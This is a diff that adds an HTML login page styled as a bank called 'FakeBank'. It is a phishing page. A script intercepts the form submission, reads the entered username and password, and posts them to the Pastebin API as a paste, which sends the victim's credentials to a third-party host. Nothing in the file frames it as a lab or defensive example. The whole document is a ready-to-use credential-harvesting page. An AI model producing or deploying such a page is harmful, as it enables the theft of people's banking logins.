@@ -1,0 +1,39 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+  <title>Login - FakeBank</title>
+  <style>
+    body { font-family: Arial; background: #f0f0f0; }
+    .login-box { width: 300px; margin: 50px auto; padding: 20px; background: white; border: 1px solid #ccc; }
+    input { width: 100%; padding: 10px; margin: 10px 0; }
+    button { width: 100%; padding: 10px; background: #4285F4; color: white; }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <h2>Login to FakeBank</h2>
+    <form id="loginForm">
+      <input type="text" placeholder="Username" required>
+      <input type="password" placeholder="Password" required>
+      <button type="submit">Login</button>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const username = document.querySelector('input[type="text"]').value;
+      const password = document.querySelector('input[type="password"]').value;
+
+      // Send the data to Pastebin
+      fetch('https://pastebin.com/api/api_post.php', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: 'api_dev_key=your_api_key&api_option=paste&api_paste_code=' + JSON.stringify({ username, password })
+      });
+    });
+  </script>
+</body>
+</html>
